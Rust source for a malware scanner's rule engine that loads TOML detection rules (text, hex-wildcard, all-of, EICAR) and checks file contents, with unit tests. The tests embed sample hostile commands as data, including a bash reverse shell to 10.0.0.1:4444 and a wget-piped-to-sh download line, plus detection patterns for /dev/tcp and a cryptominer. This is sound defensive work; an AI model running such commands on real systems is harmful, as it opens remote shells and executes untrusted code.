//! Native content rule engine.
//!
//! Rules are TOML files with `[[rule]]` entries. Three matcher kinds exist:
//!
//! * `text`  — literal substring (optionally case insensitive)
//! * `hex`   — hex byte pattern, `??` acts as a wildcard (`48 31 ?? c3`)
//! * `all_of`— every listed substring must be present
//! * `eicar` — the built-in EICAR content check
//!
//! Example:
//! ```toml
//! [[rule]]
//! name = "script/reverse_shell_devtcp"
//! description = "Reverse shell via /dev/tcp"
//! severity = "high"
//! score = 70
//! tags = ["reverse-shell"]
//! pattern = "/dev/tcp/"
//! pattern_kind = "text"
//! ```

use std::cell::OnceCell;
use std::path::Path;

use serde::{Deserialize, Serialize};

use zs_core::error::{ZsError, ZsResult};
use zs_core::model::{Detection, Severity};

use crate::builtins;

/// Largest single rules file accepted (bytes), whether from disk or embedded
/// via the API. Bounds parse time and memory for hostile rule packs.
pub const MAX_RULE_FILE_BYTES: u64 = 8 * 1024 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum PatternKind {
    #[default]
    Text,
    Hex,
    AllOf,
    Eicar,
}

#[derive(Debug, Deserialize)]
struct RawRule {
    name: String,
    #[serde(default)]
    description: String,
    #[serde(default)]
    severity: Option<String>,
    #[serde(default)]
    score: Option<u32>,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    pattern: Option<String>,
    #[serde(default)]
    pattern_kind: PatternKind,
    #[serde(default)]
    all_of: Vec<String>,
    #[serde(default)]
    case_insensitive: bool,
    #[serde(default)]
    max_scan_bytes: Option<u64>,
    #[serde(default)]
    extensions: Vec<String>,
}

#[derive(Debug, Deserialize)]
struct RawRuleFile {
    #[serde(default)]
    rule: Vec<RawRule>,
}

#[derive(Debug, Clone)]
enum Matcher {
    Text { needle: Vec<u8>, ci: bool },
    Hex(Vec<Option<u8>>),
    AllOf { needles: Vec<Vec<u8>>, ci: bool },
    Eicar,
}

#[derive(Debug, Clone)]
pub struct Rule {
    pub name: String,
    pub description: String,
    pub severity: Severity,
    pub score: u32,
    pub tags: Vec<String>,
    pub source: String,
    extensions: Vec<String>,
    max_scan_bytes: Option<u64>,
    matcher: Matcher,
}

/// Rule metadata for `zeroshield rules list`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleInfo {
    pub name: String,
    pub description: String,
    pub severity: Severity,
    pub score: u32,
    pub tags: Vec<String>,
    pub source: String,
}

impl Rule {
    fn compile(raw: RawRule, source: &str) -> ZsResult<Rule> {
        let severity = raw
            .severity
            .as_deref()
            .map(Severity::from_str_lenient)
            .unwrap_or(Severity::Medium);
        let score = raw
            .score
            .unwrap_or_else(|| builtins::score_for_severity(severity));

        let matcher = match raw.pattern_kind {
            PatternKind::Eicar => {
                if raw.pattern.is_some() || !raw.all_of.is_empty() {
                    return Err(ZsError::Scan(format!(
                        "rule '{}': eicar kind does not take pattern/all_of",
                        raw.name
                    )));
                }
                Matcher::Eicar
            }
            PatternKind::AllOf => {
                if raw.all_of.is_empty() {
                    return Err(ZsError::Scan(format!(
                        "rule '{}': all_of requires at least one entry",
                        raw.name
                    )));
                }
                let needles: Vec<Vec<u8>> = raw
                    .all_of
                    .iter()
                    .map(|s| {
                        if raw.case_insensitive {
                            s.to_ascii_lowercase().into_bytes()
                        } else {
                            s.clone().into_bytes()
                        }
                    })
                    .collect();
                Matcher::AllOf {
                    needles,
                    ci: raw.case_insensitive,
                }
            }
            PatternKind::Text => {
                let pattern = raw.pattern.as_deref().ok_or_else(|| {
                    ZsError::Scan(format!("rule '{}': missing pattern", raw.name))
                })?;
                let needle = if raw.case_insensitive {
                    pattern.to_ascii_lowercase().into_bytes()
                } else {
                    pattern.as_bytes().to_vec()
                };
                Matcher::Text {
                    needle,
                    ci: raw.case_insensitive,
                }
            }
            PatternKind::Hex => {
                let pattern = raw.pattern.as_deref().ok_or_else(|| {
                    ZsError::Scan(format!("rule '{}': missing pattern", raw.name))
                })?;
                Matcher::Hex(parse_hex_pattern(pattern).map_err(|e| {
                    ZsError::Scan(format!("rule '{}': bad hex pattern: {e}", raw.name))
                })?)
            }
        };

        Ok(Rule {
            name: raw.name,
            description: raw.description,
            severity,
            score,
            tags: raw.tags,
            source: source.to_string(),
            extensions: raw
                .extensions
                .into_iter()
                .map(|e| e.trim_start_matches('.').to_ascii_lowercase())
                .collect(),
            max_scan_bytes: raw.max_scan_bytes,
            matcher,
        })
    }

    fn applies_to_ext(&self, ext: Option<&str>) -> bool {
        if self.extensions.is_empty() {
            return true;
        }
        match ext {
            Some(e) => self.extensions.iter().any(|x| x == e),
            None => false,
        }
    }

    fn matches(&self, buf: &[u8], lower: &OnceCell<Vec<u8>>) -> bool {
        match &self.matcher {
            Matcher::Text { needle, ci } => {
                if *ci {
                    contains(lower.get_or_init(|| buf.to_ascii_lowercase()), needle)
                } else {
                    contains(buf, needle)
                }
            }
            Matcher::Hex(pattern) => match_hex(buf, pattern),
            Matcher::AllOf { needles, ci } => {
                let hay = if *ci {
                    lower.get_or_init(|| buf.to_ascii_lowercase()).as_slice()
                } else {
                    buf
                };
                needles.iter().all(|n| contains(hay, n))
            }
            Matcher::Eicar => contains(buf, &builtins::eicar_bytes()),
        }
    }
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    let first = needle[0];
    let last_start = haystack.len() - needle.len();
    let mut i = 0;
    while i <= last_start {
        if haystack[i] == first && &haystack[i..i + needle.len()] == needle {
            return true;
        }
        i += 1;
    }
    false
}

fn match_hex(buf: &[u8], pattern: &[Option<u8>]) -> bool {
    if pattern.is_empty() || buf.len() < pattern.len() {
        return false;
    }
    buf.windows(pattern.len()).any(|window| {
        window
            .iter()
            .zip(pattern.iter())
            .all(|(b, p)| p.map(|pv| pv == *b).unwrap_or(true))
    })
}

fn parse_hex_pattern(pattern: &str) -> Result<Vec<Option<u8>>, String> {
    let cleaned: String = pattern.chars().filter(|c| !c.is_whitespace()).collect();
    if cleaned.len() % 2 != 0 {
        return Err("odd number of hex digits".into());
    }
    let chars: Vec<char> = cleaned.chars().collect();
    let mut out = Vec::with_capacity(cleaned.len() / 2);
    for pair in chars.chunks(2) {
        let s: String = pair.iter().collect();
        if s == "??" || s == "?" {
            out.push(None);
        } else {
            let v = u8::from_str_radix(&s, 16).map_err(|_| format!("invalid byte '{s}'"))?;
            out.push(Some(v));
        }
    }
    Ok(out)
}

#[derive(Default)]
pub struct RuleSet {
    rules: Vec<Rule>,
}

impl RuleSet {
    pub fn new() -> Self {
        Self::default()
    }

    /// Load the rules embedded in the binary.
    pub fn with_embedded() -> ZsResult<Self> {
        let mut set = Self::new();
        set.load_embedded()?;
        Ok(set)
    }

    pub fn load_embedded(&mut self) -> ZsResult<usize> {
        let text = include_str!("../rules/embedded.toml");
        self.load_toml(text, "embedded")
    }

    pub fn load_toml(&mut self, text: &str, source: &str) -> ZsResult<usize> {
        if text.len() as u64 > MAX_RULE_FILE_BYTES {
            return Err(ZsError::Scan(format!(
                "rules from {source} are {} bytes (limit {MAX_RULE_FILE_BYTES})",
                text.len()
            )));
        }
        let raw: RawRuleFile = toml::from_str(text)
            .map_err(|e| ZsError::Scan(format!("failed to parse rules from {source}: {e}")))?;
        let mut added = 0;
        for r in raw.rule {
            self.rules.push(Rule::compile(r, source)?);
            added += 1;
        }
        Ok(added)
    }

    pub fn load_file(&mut self, path: &Path) -> ZsResult<usize> {
        let meta = std::fs::metadata(path).map_err(|e| ZsError::io(path, e))?;
        if meta.len() > MAX_RULE_FILE_BYTES {
            return Err(ZsError::Scan(format!(
                "rules file {} is {} bytes (limit {MAX_RULE_FILE_BYTES})",
                path.display(),
                meta.len()
            )));
        }
        let text = std::fs::read_to_string(path).map_err(|e| ZsError::io(path, e))?;
        self.load_toml(&text, &path.display().to_string())
    }

    /// Load every `*.toml` in a directory (non recursive). Missing dirs are ok.
    pub fn load_dir(&mut self, dir: &Path) -> ZsResult<usize> {
        if !dir.is_dir() {
            return Ok(0);
        }
        let mut added = 0;
        for entry in std::fs::read_dir(dir).map_err(|e| ZsError::io(dir, e))? {
            let entry = match entry {
                Ok(e) => e,
                Err(_) => continue,
            };
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                added += self.load_file(&path)?;
            }
        }
        Ok(added)
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    pub fn describe(&self) -> Vec<RuleInfo> {
        self.rules
            .iter()
            .map(|r| RuleInfo {
                name: r.name.clone(),
                description: r.description.clone(),
                severity: r.severity,
                score: r.score,
                tags: r.tags.clone(),
                source: r.source.clone(),
            })
            .collect()
    }

    /// Stable fingerprint of the loaded rules (order sensitive). Used to
    /// invalidate the clean-file cache when the rule set changes.
    pub fn fingerprint(&self) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        for r in &self.rules {
            hasher.update(r.name.as_bytes());
            hasher.update(b"\0");
            hasher.update(r.description.as_bytes());
            hasher.update(b"\0");
            hasher.update(r.severity.as_str().as_bytes());
            hasher.update(b"\0");
            hasher.update(r.score.to_le_bytes());
            hasher.update(b"\0");
            hasher.update(r.source.as_bytes());
            hasher.update(b"\0");
            for t in &r.tags {
                hasher.update(t.as_bytes());
                hasher.update(b"\0");
            }
            hasher.update(b"\x01");
            for e in &r.extensions {
                hasher.update(e.as_bytes());
                hasher.update(b"\0");
            }
            hasher.update(b"\x02");
            hasher.update(r.max_scan_bytes.unwrap_or(0).to_le_bytes());
            hasher.update(format!("{:?}", r.matcher).as_bytes());
            hasher.update(b"\x03");
        }
        hex::encode(hasher.finalize())
    }

    /// Run every applicable rule against a content buffer.
    pub fn check(&self, buf: &[u8], path: &Path) -> Vec<Detection> {
        let ext = path
            .extension()
            .and_then(|e| e.to_str())
            .map(|e| e.to_ascii_lowercase());
        let lower: OnceCell<Vec<u8>> = OnceCell::new();
        let mut out = Vec::new();
        for rule in &self.rules {
            if !rule.applies_to_ext(ext.as_deref()) {
                continue;
            }
            let window = match rule.max_scan_bytes {
                Some(max) if (max as usize) < buf.len() => &buf[..max as usize],
                _ => buf,
            };
            if rule.matches(window, &lower) {
                let mut det = Detection::new(
                    "rule",
                    format!("rule/{}", rule.name),
                    if rule.description.is_empty() {
                        rule.name.clone()
                    } else {
                        rule.description.clone()
                    },
                    rule.score,
                );
                det.severity = rule.severity;
                det.tags = rule.tags.clone();
                out.push(det);
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn p(name: &str) -> PathBuf {
        PathBuf::from(name)
    }

    #[test]
    fn text_rule_matches() {
        let set = RuleSet::with_embedded().unwrap();
        assert!(set.len() >= 8);
        let hits = set.check(
            b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
            &p("x.sh"),
        );
        assert!(hits.iter().any(|d| d.name.contains("devtcp")));
    }

    #[test]
    fn eicar_rule_matches() {
        let set = RuleSet::with_embedded().unwrap();
        let hits = set.check(&builtins::eicar_bytes(), &p("eicar.com"));
        assert!(hits.iter().any(|d| d.name.contains("eicar")));
        assert!(hits.iter().any(|d| d.score >= 90));
    }

    #[test]
    fn allof_rule_requires_all_parts() {
        let set = RuleSet::with_embedded().unwrap();
        let partial = set.check(b"wget http://x/y", &p("a.sh"));
        assert!(!partial.iter().any(|d| d.name.contains("download_pipe")));
        let full = set.check(b"wget http://x/y -O - | sh", &p("a.sh"));
        assert!(full.iter().any(|d| d.name.contains("download_pipe")));
    }

    #[test]
    fn hex_wildcard_matching() {
        let text = r#"
[[rule]]
name = "test/hex"
description = "shellcode-ish"
pattern = "48 31 ?? c3"
pattern_kind = "hex"
score = 50
"#;
        let mut set = RuleSet::new();
        set.load_toml(text, "test").unwrap();
        assert_eq!(set.check(&[0x48, 0x31, 0xc0, 0xc3], &p("b.bin")).len(), 1);
        assert_eq!(set.check(&[0x48, 0x31, 0xc0, 0xc0], &p("b.bin")).len(), 0);
    }

    #[test]
    fn extension_filter() {
        let text = r#"
[[rule]]
name = "test/ext"
description = "only shell scripts"
pattern = "drop table"
pattern_kind = "text"
extensions = ["sh"]
score = 40
"#;
        let mut set = RuleSet::new();
        set.load_toml(text, "test").unwrap();
        assert_eq!(set.check(b"drop table", &p("x.sh")).len(), 1);
        assert_eq!(set.check(b"drop table", &p("x.txt")).len(), 0);
    }

    #[test]
    fn case_insensitive_text() {
        let text = r#"
[[rule]]
name = "test/ci"
description = "ci"
pattern = "XMRIG"
pattern_kind = "text"
case_insensitive = true
score = 90
"#;
        let mut set = RuleSet::new();
        set.load_toml(text, "test").unwrap();
        assert_eq!(set.check(b"running xmrig now", &p("a")).len(), 1);
    }

    #[test]
    fn rejects_malformed_rules() {
        let text = r#"
[[rule]]
name = "bad"
pattern_kind = "hex"
pattern = "4"
"#;
        let mut set = RuleSet::new();
        assert!(set.load_toml(text, "test").is_err());
    }

    #[test]
    fn fingerprint_tracks_rule_changes() {
        let a = RuleSet::with_embedded().unwrap();
        let b = RuleSet::with_embedded().unwrap();
        assert_eq!(a.fingerprint(), b.fingerprint());

        let mut c = RuleSet::with_embedded().unwrap();
        c.load_toml(
            r#"
[[rule]]
name = "test/extra"
pattern = "extra-pattern"
pattern_kind = "text"
score = 40
"#,
            "test",
        )
        .unwrap();
        assert_ne!(a.fingerprint(), c.fingerprint());

        // Same rule, different score: must change the fingerprint.
        let mut d = RuleSet::with_embedded().unwrap();
        d.load_toml(
            r#"
[[rule]]
name = "test/extra"
pattern = "extra-pattern"
pattern_kind = "text"
score = 60
"#,
            "test",
        )
        .unwrap();
        assert_ne!(c.fingerprint(), d.fingerprint());
    }
}
